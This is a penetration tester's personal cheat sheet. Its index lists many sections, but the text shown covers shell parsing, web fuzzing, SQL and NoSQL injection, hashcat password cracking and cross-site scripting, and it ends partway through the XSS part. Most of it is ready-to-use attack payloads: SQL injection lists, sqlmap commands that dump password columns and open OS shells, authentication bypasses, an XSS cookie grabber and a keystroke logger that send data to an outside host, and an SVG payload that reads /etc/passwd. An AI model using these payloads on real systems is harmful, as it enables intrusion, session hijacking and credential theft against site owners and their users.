=================================>INDEX <===
>GREPS & PARSER
>WEB FUZZING
>SQL INJECTIONS
>BREAKING HASHES
>CROSS SITE SCRIPTING (XSS)
>OTHER WEBSITE ATTACKS
>CLIENT/FELLAS SIDE ATTACK
>RED TEAM
>BLUE TEAM
>THREAT INTELLIGENCE
>LINUX & CONFIGUATION
>NMAP & NETWORK SCAN
>POST EXPLOITATION
>SERVICES
>FORENSICS
>DOCKER
>INCIDENT RESPONSE
>RASPBERRY PI - DOCKER
>MOBILE
>WIFI
>RADARE2
>REVERSE ENGINEERING - EXPLOITING
>RASPBERRY PI ZERO - RESPONDER ATTACK
>EXPLOITS
>RFID
>IoT
>CODE REVIEW
>CODING
>MALWARE
>THEORY AND RESOURCES
>OTHER STUFF
=================================><===


=================================>GREPS & PARSERS <===
-----------Grep continuous stream
tail -f mail.info | grep --line-buffered "pepemail\.com" | grep --line-buffered status= --color
-----------

-----------Remove line break with grep
grep asdfasdf hola.txt | tr "\n" ";"
-----------

-----------Replace values with sed
sed -i -e 's/few/asd/g' hello.txt
-----------

-----------Sed between two words, nice for XML
sed -n "/<table>/,/<\/table>/p"
-----------

-----------Recursive grep
grep -Ril "10.115.4.X2" / 2> /dev/null
-----------

-----------Sed with groups
sed 's/.*string>\(.*\)<\/string.*/\1/'
-----------

-----------If grep
while read line; do if grep -q $line "$salida2"; then echo "SI --> $line"; else echo "NO --> $line"; fi done
---
hola='UZZZZZZ->displayName:: xXxxXxxXxxxxXXXXxx='
if echo $hola|grep -q displayi; then echo "SI"; else echo "NO"; fi
-----------

-----------If grep whois
echo "8.8.8.8
8.8.8.8
8.8.8.8" | while read line; do echo "--$line"; if whois $line | grep -qi PEPE; then echo "YES"; else echo "NO"; fi; done
-----------

-----------Add first line on a file
echo -e "primera fila\n$(cat pepe10)" > pepe10
-----------

-----------Add a value to a file searching by value
sed -i -e "s/\($adios.*\)/\1$que/g" ./pepe.log
-----------

-----------Bash WHILE-FOR
count=50;while [ $count -le 70 ]; do wget https://www.xxxxxx.com/081020151347"$count".csv; sleep 1; (( count++ )); done
-----------

-----------Regex IP format
# Easy
grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"
# Public IPs
grep -oE "\b(?!(10)|192\.168|172\.(2[0-9]|1[6-9]|3[0-2]))[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"
-----------

-----------Parse masscan results from taskdistributor (ready for nessus)
# IPs
cat * | grep -o "addr=\".*\" addr" | cut -d '"' -f 2 | sort | uniq | sort
# Get all ports
cat * | grep -o "portid=\".*\"><st" | cut -d '"' -f 2 | sort | uniq | sort -n | tr "\n" ","
-----------

-----------Taskdistributor - create a job
#!/usr/bin/env bash

filename=`date -u +"%Y%m%d%H%M%S"`".xml"
masscan --range "{0}" --ports T:1-65535 --rate 10000 --output-filename $filename
cat $filename
-----------

-----------Parse IP;Protocol;Port from Nessus by plugin custom report (.html)
cat byplugin.html | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3} \(.../.......\b" | sed 's/ (/;/g' | sed 's/\//;/g' | sed 's/)<;//g' | sed 's/h2//g' | sort | uniq | sort
-----------

-----------Port number to service name (with nmap database)
cat /usr/share/nmap/nmap-services | tr "\t" ";" | grep ";2049/tcp" | cut -d ";" -f 1
-----------
=================================><===


=================================>WEB FUZZING <===
-----------Dirb - fuzzing
dirb <host> /dictionary
-----------

-----------Wfuzz
wfuzz -c -z file,/root/Desktop/Dictionar/all.txt  --hc 404 https://www.xxxxxx.com/FUZZ
wfuzz -c -z file,/media/sf_Shared_vm/Fuzzing\&Pass/SecLists/Discovery/Web_Content/raft-large-files.txt -t 25 -R 1 --hc 404,403 --hh 0,143 http://www.xxxxxxxx.com/FUZZ
wfuzz -c -z file,/media/sf_Shared_vm/Fuzzing\&Pass/SecLists/Discovery/Web_Content/raft-large-directories.txt -t 1 -R 1 --hc 404,403 http://www.xxxxxxxx.com/FUZZ
-----------

-----------Wfuzz (with cookies)
wfuzz -c -z file,/root/Desktop/Dictionar/all.txt --hc 404 -b "loguser=; logpass=; hciw=1; hsnu=Pepe; ASP.NET_SessionId=yewr3vdm4m1ygm4gxhcizuzm; hscid=-1; .ASPXAUTH=000B5BF451BD67DXXXXXXXXXXXXX" https://www.xxxxxxx.com/FUZZ
---> copy/paste the cookies from the "to curl" burp option
-----------

-----------Wfuzz with docker (openssl fixed)
docker run -v /media/sf_Shared_VM/SecLists/Discovery/Web-Content/:/mnt/test dominicbreuker/wfuzz:latest -c -z file,/mnt/test/raft-medium-directories-lowercase.txt --hc 404 https://xxxxxxxx.com/FUZZ
-----------

-----------Fuzz - potentially dangerous files list
# https://github.com/Bo0oM/fuzz.txt/blob/master/fuzz.txt
-----------

-----------Gobuster (much faster than wfuzz)
### Install:
sudo apt-get install golang
git clone https://github.com/OJ/gobuster
cd gobuster
### Run:
go run main.go -u https://example.com -w wordlist.txt -s 200,301 -k -t 100 -v 				--> -k no certificate check -v verbose -t threads 
-----------

-----------Fuzzing URL parameters
# https://www.hackplayers.com/2018/08/aron-parametros-get-post-bruteforce.html
-----------
=================================><===


=================================>SQL INJECTIONS <===
-----------Manual SQL injections - SQLi
# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20injection
# https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
### PASSWORD BYPASS:
AND Password='asdf' OR '1' = '1

### STACKED QUEREIES:
id=10; INSERT INTO users (…)
	
### UNION:		-->(1- add "NULL" columns until you know how many they have, 2- change the column to know which one is printable, 3- look for the concatenated text "sssssectest")
#> -SQLi Unin Based - Payloads
id=3 UNION ALL SELECT NULL, NULL, CONCAT(0x7373737373, 0x73323173656374657374), NULL--				-->(MYSQL)

### BOOLEAN: 	-->(1- Detect the false query to view the difference with the true one, 2- When you know the false response find leter by letter)
#> -SQLi Error Based - Payloads
id=1 AND 1 = 2			--> (False) insert this statment to view the difference in the response with the true one 
id=1 AND 1 = 1			--> (True)
1 AND ASCII(SUBSTRING(current_user(),1,1))=112			--> 112 aciii p

### BOOLEAN TIME BASED:
#> -SQL Time Based - Payload
AND IF(version() like '5%', sleep(10), 'false'))--
-----------

-----------SQLi Escape chars - Payloads#
# https://github.com/1N3/IntruderPayloads/blob/master/FuzzLists/sqli_escape_chars.txt
'
"
''
'"
;

)
')
")
");
';
";
%'
%"
%')
%")
'))
"))
")))
-----------

-----------SQLi Unin Based - Payloads
# https://github.com/1N3/IntruderPayloads/blob/master/FuzzLists/sqli-union-select.txt
 ORDER BY SLEEP(5)
 ORDER BY 1,SLEEP(5)
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4
	...
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
 ORDER BY SLEEP(5)#
 ORDER BY 1,SLEEP(5)#
 ORDER BY 1,SLEEP(5),3#
 ORDER BY 1,SLEEP(5),3,4#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#
  ...
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#
 ORDER BY SLEEP(5)-- 
 ORDER BY 1,SLEEP(5)-- 
 ORDER BY 1,SLEEP(5),3-- 
 ORDER BY 1,SLEEP(5),3,4-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5-- 
  ...
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- 
 UNION ALL SELECT 1
  ...
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
 UNION ALL SELECT 1#
  ...
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#
 UNION ALL SELECT 1-- 
  ...
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- 
 UNION SELECT @@VERSION,SLEEP(5),3
 UNION SELECT @@VERSION,SLEEP(5),USER(),4
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5
  ...
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
 UNION SELECT @@VERSION,SLEEP(5),"'3
 UNION SELECT @@VERSION,SLEEP(5),"'3'"#
 UNION SELECT @@VERSION,SLEEP(5),USER(),4#
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5#
	...
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#
 UNION ALL SELECT USER()-- 
 UNION ALL SELECT SLEEP(5)-- 
 UNION ALL SELECT USER(),SLEEP(5)-- 
 UNION ALL SELECT @@VERSION,USER(),SLEEP(5)-- 
 UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))-- 
 UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL-- 
	...
 UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
 UNION ALL SELECT NULL-- 
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))-- 
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))-- 
  ...
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))-- 
 UNION ALL SELECT NULL#
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#
  ...
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#
 UNION ALL SELECT NULL 
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))
  ...
 AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))
 AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))
 AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC)
 AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
 UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL-- 
 UNION ALL SELECT 'INJ'||'ECT'||'XXX'
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2
	...
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
 UNION ALL SELECT 'INJ'||'ECT'||'XXX'-- 
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2-- 
	...
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- 
 UNION ALL SELECT 'INJ'||'ECT'||'XXX'#
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#
	...
 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#
-----------

-----------SQLi Error Based - Payloads
# https://github.com/1N3/IntruderPayloads/blob/master/FuzzLists/sqli-error-based.txt
 OR 1=1
 OR 1=0
 OR x=x
 OR x=y
 OR 1=1#
 OR 1=0#
 OR x=x#
 OR x=y#
 OR 1=1-- 
 OR 1=0-- 
 OR x=x-- 
 OR x=y-- 
 OR 3409=3409 AND ('pytW' LIKE 'pytW
 OR 3409=3409 AND ('pytW' LIKE 'pytY
 HAVING 1=1
 HAVING 1=0
 HAVING 1=1#
 HAVING 1=0#
 HAVING 1=1-- 
 HAVING 1=0-- 
 AND 1=1
 AND 1=0
 AND 1=1-- 
 AND 1=0-- 
 AND 1=1#
 AND 1=0#
 AND 1=1 AND '%'='
 AND 1=0 AND '%'='
 AND 1083=1083 AND (1427=1427
 AND 7506=9091 AND (5913=5913
 AND 1083=1083 AND ('1427=1427
 AND 7506=9091 AND ('5913=5913
 AND 7300=7300 AND 'pKlZ'='pKlZ
 AND 7300=7300 AND 'pKlZ'='pKlY
 AND 7300=7300 AND ('pKlZ'='pKlZ
 AND 7300=7300 AND ('pKlZ'='pKlY
 AS INJECTX WHERE 1=1 AND 1=1
 AS INJECTX WHERE 1=1 AND 1=0
 AS INJECTX WHERE 1=1 AND 1=1#
 AS INJECTX WHERE 1=1 AND 1=0#
 AS INJECTX WHERE 1=1 AND 1=1--
 AS INJECTX WHERE 1=1 AND 1=0--
 WHERE 1=1 AND 1=1
 WHERE 1=1 AND 1=0
 WHERE 1=1 AND 1=1#
 WHERE 1=1 AND 1=0#
 WHERE 1=1 AND 1=1--
 WHERE 1=1 AND 1=0--
 ORDER BY 1-- 
 ORDER BY 2-- 
 ORDER BY 31337-- 
 ORDER BY 1# 
 ORDER BY 2# 
 ORDER BY 31337#
 ORDER BY 1 
 ORDER BY 2 
 ORDER BY 31337 
 RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
 RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--
IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
%' AND 8310=8310 AND '%'='
%' AND 8310=8311 AND '%'='
 and (select substring(@@version,1,1))='X'
 and (select substring(@@version,1,1))='M'
 and (select substring(@@version,2,1))='i'
-----------

-----------SQLi Time Based - Payloads
# https://raw.githubusercontent.com/1N3/IntruderPayloads/master/FuzzLists/sqli-time-based.txt
 AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
 AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
 AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
 AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
 AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
SLEEP(5)#
SLEEP(5)-- 
SLEEP(5)="
SLEEP(5)='
 or SLEEP(5)
 or SLEEP(5)#
 or SLEEP(5)--
 or SLEEP(5)="
 or SLEEP(5)='
waitfor delay '00:00:05'
waitfor delay '00:00:05'-- 
waitfor delay '00:00:05'#
benchmark(50000000,MD5(1))
benchmark(50000000,MD5(1))-- 
benchmark(50000000,MD5(1))#
 or benchmark(50000000,MD5(1))
 or benchmark(50000000,MD5(1))-- 
 or benchmark(50000000,MD5(1))#
pg_SLEEP(5)
pg_SLEEP(5)-- 
pg_SLEEP(5)#
 or pg_SLEEP(5)
 or pg_SLEEP(5)-- 
 or pg_SLEEP(5)#
'\"
 AnD SLEEP(5)
 AnD SLEEP(5)--
 AnD SLEEP(5)#
&&SLEEP(5)
&&SLEEP(5)--
&&SLEEP(5)#
' AnD SLEEP(5) ANd '1
'&&SLEEP(5)&&'1
 ORDER BY SLEEP(5)
 ORDER BY SLEEP(5)-- 
 ORDER BY SLEEP(5)#
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
+benchmark(3200,SHA1(1))+'
 + SLEEP(10) + '
 RANDOMBLOB(500000000/2)
 AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
 OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
 RANDOMBLOB(1000000000/2)
 AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
 OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
-----------

-----------SQL injections SQLMAP - SQLi
### Detect a vulnerable field:
sqlmap -u "xxxx.com/front/visor/video.php?cerca=aa"
### Get the databases
sqlmap -u "xxxx.com/front/visor/video.php?cerca=aa" --dbs
### Get the tables of the database
sqlmap -u "xxxx.com/front/visor/video.php?cerca=aa" --tables -D <thisisthedatabasename>
### Slow queries
-u 'https://xxxxxxxx.es:443/es/index/getpdf/?type=LC&id=43411' --cookie='PHPSESSID=70l50g9qtkfuv828p2fboug715; mundo_cookies=1' --technique=SUEBQ -D xxxxx -T socios -C password --dump 
--where='idSocio=2373660' --beep --delay=1 --timeout=200 --retries=3 --keep-alive --threads=1 --dbms=MySQL --hex --fresh-queries --sql-query="SELECT password FROM socios WHERE email='xxxxx@yyyy.com'"
### Command execution:
--os-cmd=hostname
--os-shell
--sql-shell
--file-read=/etc/passwd
--file-write
--priv-esc
--sql-query=""
### Select database engine:
--dbms=MSSQL
-----------

-----------SQLi MSSQL blind time based injection
SQLi query: ‘ waitfor delay’0:0:10’--
-----------

-----------NoSQL injections
# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20injection
# Basic authentication bypass using not equal ($ne)
username[$ne]=toto&password[$ne]=toto
# Extract length information
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
# Extract data information
username[$ne]=toto&password[$regex]=m.{2}
username[$ne]=toto&password[$regex]=md.{1}
username[$ne]=toto&password[$regex]=mdp
username[$ne]=toto&password[$regex]=m.*
username[$ne]=toto&password[$regex]=md.*
# MongoDB Payloads
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1'
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
{$gt: ''}
[$ne]=1
-----------

-----------SQLi RCE, execute commands
# http://resources.infosecinstitute.com/backdoor-sql-injection/#gref
# http://www.blackhat.com/presentations/bh-europe-09/Guimaraes/Blackhat-europe-09-Damele-SQLInjection-slides.pdf
# https://www.gracefulsecurity.com/sql-injection-cheat-sheet-mssql/
- If it's DBA enable the xp_cmdshell, then run commands directly with the EXEC for MSSQL.
- Writable directory in www and FILE privileges enabled, with the INTO OUTFILE command for MySQL.
-----------
=================================><===


=================================>BREAKING HASHES <===
-----------HASHING mysql passwords (-m 300 -> mysql    -a 1 -> dictionary + mixed)
hashcat -m 300 -a 1 hash /root/Desktop/passwords/rockyou.txt 
-----------

-----------HASHING domain hash NTLM (-m 300 -> mysql    -a 1 -> dictionary + mixed)
hashcat -m 1000 -a 1 hash /root/Desktop/passwords/rockyou.txt 
-----------

-----------HASHING NTLMv2 password (en pass.txt insert all the chunk)
### NTLMv2:
hashcat -m 5600 pass.txt /media/sf_Shared_VMs/SecLists/Passwords/*
-----------

-----------NetNTLMv1
./oclHashcat64.bin -m 5500 pass.txt -a3 mymask.hcmask
-----------

-----------HASHING NTLMv2 password (oclHashcat with GPU)
./oclHashcat64.bin -m 5600 pass.txt -a3 mymask.hcmask
-----------

-----------Typical passwords mask.hcmask (oclHashcat mask file, extension name mandatory) - hashcat
?u?l?l?l?l?l?l?l?d

?l?l?l
?l?l?l?l
?l?l?l?l?l
?l?l?l?l?l?l
?l?l?l?l?l?l?l
?l?l?l?l?l?l?l?l

?l?l?l?l?l?l?d
?l?l?l?l?l?l?d?d
?l?l?l?l?l?l?l?d

?u?l?l
?u?l?l?l
?u?l?l?l?l
?u?l?l?l?l?l
?u?l?l?l?l?l?l
?u?l?l?l?l?l?l?l

?u?l?l?l?l?l?d
?u?l?l?l?l?l?d?d
?u?l?l?l?l?l?l?d
-----------

-----------Hashcat best rules
# https://www.notsosecure.com/one-rule-to-rule-them-all/
# https://github.com/NotSoSecure/password_cracking_rules
-----------

-----------Hashcat cracking approximation (sorted)
## Test all dictionaries:
sudo hashcat -m 13100 hashes/a.hash -w 3 -a 0 wordlist/*.txt
## Dictionary + combination left side:
sudo hashcat -m 13100 hashes/a.hash -w 3 -a 1 wordlist/dict1.txt wordlist/dict1.txt -j '$'
## Dictionary + combination right side:
sudo hashcat -m 13100 hashes/a.hash -w 3 -a 1 wordlist/dict1.txt wordlist/dict1.txt -k '$'
## Dictionary + combination both side + char:
sudo hashcat -m 13100 hashes/a.hash -w 3 -a 1 wordlist/dict1.txt wordlist/dict1.txt -j '$' -k '$!'
## Dictionary + rules:
sudo hashcat -m 13100 hashes/r.hash -w 3 -a 0 wordlist/example.txt -r rules/OneRuleToRuleThemAll.rule
## Mask:
sudo hashcat -m 13100 hashes/r.hash -w 3 -a 3 generic.hcmask
## Hybrid Wordlist + Mask:
sudo hashcat -m 13100 hashes/r.hash -w 3 -a 6 wordlist/dict1.txt ?d?d?d?d
## Hybrid Mask + Wordlist:
sudo hashcat -m 13100 hashes/r.hash -w 3 -a 7 ?d?d?d?d wordlist/dict1.txt
-----------

-----------Hate crack - A tool for automating cracking methodologies through Hashcat from the TrustedSec team
# https://github.com/trustedsec/hate_crack
-----------

-----------Secrets and hashes
hashpump --> tool
Lenght Extension Attack --> burp tool
-----------

-----------Order mask by line length (to show results faster)
awk '{ print length($0) " " $0; }' mask.hcmask | sort -n | cut -d ' ' -f 2-
-----------

-----------Hashcat generate custom dictionary (generates big files)
echo "pepe">input.txt; echo -e "a=@ \na=4 \na=a \na=A \nb=8 \nb=b \nb=B \nc=c \nc=C \nd=d \nd=D \ne=e \ne=E \ne=3 \nf=f \nf=F \ng=6 \ng=g \ng=G \nh=h \nh=H \ni=i \ni=I \ni=1 \nj=j
\nj=J \nk=k \nk=K \nl=l \nl=L \nl=1 \nl=7 \nm=m \nm=M \nn=n \nn=N \no=0 \no=O \no=0 \np=p \np=P \nq=q \nq=Q \nr=r \nr=R \ns=s \ns=S \ns=5 \nt=t \nt=T \nt=7 \nu=u \nu=U \nv=v \nv=V 
\nw=w \nw=W \ny=y \ny=Y \nz=z \nz=Z" > lookup_table.txt; hashcat --attack-mode 5 --table-file lookup_table.txt --stdout input.txt | tr -d " ">
permuted.txt; rm input.txt; rm lookup_table.txt; /usr/lib/hashcat-utils/combinator.bin permuted.txt /media/sf_Shared_VMs/SecLists/Passwords/rockyou.txt>new_dic_permuted.txt; 
hashcat -m 5500 -a 1 hashes_xxxx.txt new_dic_permuted.txt; rm new_dic_permuted.txt
-----------

-----------HASHING SAM windows(In the hash.txt the second part of the hash --> 4aa4f03a7dcbefcb914b910bf5658941)
hashcat -m 1000 -a 0 hash.txt ./passwords/rockyou.txt
-----------

-----------Dictionary: generate password permutation (John)
john --wordlist=./pepedictionary.txt --rules --stdout > pepedictionary_v2.txt
-----------

-----------Dictionary: generate password permutation (pipeline2)
# https://github.com/hirnschallsebastian/Pipeline2
# http://www.kitploit.com/2017/08/pydictor-powerful-and-useful-hacker.html
-----------

-----------Password lenght stats
awk '{ print length($0) }' pass.txt | sort | uniq -c | sort -n
-----------
=================================><===


=================================>CROSS SITE SCRIPTING (XSS) <===
-----------Basic XSS
<script>alert(document.cookie);</script>
# onerror:
'"><img src=p onerror=alert(0)>
-----------

-----------XSS Cookie grabber
# Typical:
python -m SimpleHTTPServer
<script>location.href='http://xx.xx.xx.xx:8000/a.php?cookie='+document.cookie;</script>
# Via XMLHttpRequest:
javascript:x=new XMLHttpRequest();x.open("GET", 'http://X.X.X.X/a.php?cookie='+document.cookie, true); x.send()
-----------

-----------XSS Escape Chars - Payloads
# https://github.com/1N3/IntruderPayloads/blob/master/FuzzLists/xss_escape_chars.txt
' 
" 
">
/'>
')>
")>
">
'">
'>
; 

') 
") 
"); 
\"+
\"); 
'>
">
"/>
'>
\"
\'
\";
';
#
<!-- INJECTX
// INJECTX
/* INJECTX
-----------

-----------XSS ASP.NET
http://blog.diniscruz.com/2014/06/bypassing-aspnet-request-validation.html
-----------

-----------Iframe in an XSS
<script>document.body.innerHTML='<iframe src="http://X.X.X.X/w3login.html" height="1000" width="1000" frameborder="0">'</script>
-----------

-----------XSS Keylogger
# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection
<img src=x onerror='document.onkeypress=function(e){fetch("http://domain.com?k="+String.fromCharCode(e.which))},this.remove();'>
-----------

-----------XSS filter evasion - Bypass
# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection
<img src=asdf onerror=alert(document.cookie)>
<svg/onload=alert(1)>				--> inseide HTML
<svgonload=alert("pepe")>			--> https://jsfiddle.net/t2vknvgc/		--> without using slash
# https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
# http://www.jsfuck.com/				--> only with symbols
<scr<script>ipt>					--> evade <script> filter
%2E%2E	+ (%->%25)	= %252E%252E	--> double encoding
<script src="http://short.">		--> store in short.xx the script
-----------

-----------XSS UTF-7
# http://stackoverflow.com/questions/29425930/xss-bypassing-angle-brackets-and-double-quotes-escaping
INPUTNAME = +ADw-script+AD4-myfunc()+ADw-/script+AD4-
<h2>Profile of <script>myfunc()</script></h2><p>INPUT2</p><a href="http://example.com">Homepage</a>
-----------

-----------XSS in a .SVG image (simple, dosent get document cookies)
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
      alert("XSS");
   </script>
</svg>
-----------

-----------XSS in a .SVG image and iframe to get the cookies of the parent
<?xml version="1.0"?>
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
	<p xmlns="http://www.w3.org/1999/xhtml">
		<iframe id="x" src="/">
		</iframe>
		<script>
			alert(document.getElementById("x").contentDocument.cookie)
		</script>
	</p>
</svg>
-----------

-----------XSS with .SVG and local file inclusion (LFI)
<?xml version=”1.0" encoding=”UTF-8" standalone=”yes”?>
<svg xmlns=”http://www.w3.org/2000/svg">
   <script>alert(document.location);</script>
   <script>
      function readTextFile(file){
         var rawFile = new XMLHttpRequest();
         rawFile.open(“GET”, file, false);
         rawFile.onreadystatechange = function ()
      {
      
      if(rawFile.readyState === 4){
         if(rawFile.status === 200 || rawFile.status == 0){
            var allText = rawFile.responseText;
            alert(allText);
         }
      }
      
     rawFile.send(null);
   readTextFile(“file:///../../../../../../../../../etc/passwd”);
   </script>
</svg>
-----------

-----------XSS in an .XML file
<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
</body>
</html>
-----------

-----------XSS in .swf flash
# https://www.acunetix.com/blog/articles/elaborate-ways-exploit-xss-flash-parameter-injection/
-----------

-----------XSS Bypass Examples
# 666 more at https://gist.github.com/JohannesHoppe/5612274
# some more at http://xss.cx/examples/ultra-low-hanging-fruit/no-experience-required-xss-signatures-only-fools-dont-use.txt
